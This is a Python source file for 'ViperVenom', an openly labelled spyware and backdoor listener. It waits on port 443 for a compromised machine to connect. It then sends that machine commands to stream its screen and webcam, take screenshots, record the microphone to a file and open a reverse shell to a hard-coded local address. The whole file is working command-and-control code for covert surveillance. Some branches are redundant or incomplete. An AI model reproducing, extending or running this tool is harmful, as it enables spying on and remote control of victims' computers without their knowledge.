import socket
import time
import platform
import os
import threading
from termcolor import colored
from vidstream import *
# =====================================================> Clears Terminal
def Clear():
    if platform.system() == "Windows":
        os.system('cls')
    else:
        os.system("clear")

Clear()

time.sleep(2)

# =====================================================> Banner
def Banner():
    
    print(colored('''
 ██▒   █▓ ██▓ ██▓███  ▓█████  ██▀███   ██▒   █▓▓█████  ███▄    █  ▒█████   ███▄ ▄███▓
▓██░   █▒▓██▒▓██░  ██▒▓█   ▀ ▓██ ▒ ██▒▓██░   █▒▓█   ▀  ██ ▀█   █ ▒██▒  ██▒▓██▒▀█▀ ██▒
 ▓██  █▒░▒██▒▓██░ ██▓▒▒███   ▓██ ░▄█ ▒ ▓██  █▒░▒███   ▓██  ▀█ ██▒▒██░  ██▒▓██    ▓██░
  ▒██ █░░░██░▒██▄█▓▒ ▒▒▓█  ▄ ▒██▀▀█▄    ▒██ █░░▒▓█  ▄ ▓██▒  ▐▌██▒▒██   ██░▒██    ▒██ 
   ▒▀█░  ░██░▒██▒ ░  ░░▒████▒░██▓ ▒██▒   ▒▀█░  ░▒████▒▒██░   ▓██░░ ████▓▒░▒██▒   ░██▒
   ░ ▐░  ░▓  ▒▓▒░ ░  ░░░ ▒░ ░░ ▒▓ ░▒▓░   ░ ▐░  ░░ ▒░ ░░ ▒░   ▒ ▒ ░ ▒░▒░▒░ ░ ▒░   ░  ░
   ░ ░░   ▒ ░░▒ ░      ░ ░  ░  ░▒ ░ ▒░   ░ ░░   ░ ░  ░░ ░░   ░ ▒░  ░ ▒ ▒░ ░  ░      ░
     ░░   ▒ ░░░          ░     ░░   ░      ░░     ░      ░   ░ ░ ░ ░ ░ ▒  ░      ░   
      ░   ░              ░  ░   ░           ░     ░  ░         ░     ░ ░         ░   
     ░                                     ░                                         ''', 'red'))
    print(colored("            ViperVenom - Listener & Spyware Tool Maintained By Itay Funes", "cyan"))
    print()
Banner()

# =====================================================> Main Menu
def Menu():
    print(colored("""
1) Start Handler Listener
""", 'blue'))
    print()
Menu()
# =====================================================> Vars

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
des=input(colored("Pleases Select Option: ", 'yellow'))
BUFFER_SIZE = 1024

# =====================================================> Backdoor Listener

def Listener():
    ListenerHost= input(colored("[*] Enter Listener IP Address: ", 'red'))
    ListenerPort= 443
    s.bind((ListenerHost, ListenerPort))
    s.listen(99)
    time.sleep(1)
    print(colored("[*] Starting Listener...", 'cyan'))
    time.sleep(1)
    print(colored(f"Listener Started on {ListenerHost}:{ListenerPort}, Waiting for Connections...", "red"))
    conn, addr = s.accept()
    recv_data = conn.recv(BUFFER_SIZE).decode("utf-8")
    with conn:
        print(colored(f"Recived Connection From: {addr}:{recv_data}", 'blue'))

        serv = StreamingServer(ListenerHost, 4444)
        serv.start_server()
        time.sleep(2)
        print(colored("[+] Connecting to the Session...", 'blue'))

        while True:

            Handler = input(f"{addr[0]}:{recv_data} ⇄    ")
            if Handler == "screenshare":       
                conn.send(Handler.encode("utf-8"))
            elif Handler == "webcam_stream":
                conn.send(Handler.encode("utf-8"))
            elif Handler == "cls":
                if platform.system() == "Linux":
                    os.system('clear')
                else:
                    os.system("cls")
            elif Handler == "exit":
                exit()
            elif Handler == "screenshot":
                conn.send(Handler.encode("utf-8"))
            elif Handler == "exit":
                print(colored("[*] Exiting From Active Session...", "red"))
                time.sleep(2)
                break
            elif Handler == "mic_record":
                conn.send(Handler.encode("utf-8"))
                with open('aud0.wav','wb') as f: 
                    while True:
                        l = conn.recv(1024)
                        if not l: break
                        f.write(l)
            elif Handler == "revshell":
                conn.send(Handler.encode("utf-8"))
                lhost = "192.168.1.107"
                lport = 4434
                while True:
                    conn.recv(1024)






# =====================================================> Menu Option
if des >= "1":
    Listener()

else:
    print(colored("[*] ERROR Invaild Argument, Exiting...", "red"))
    while True:
        break
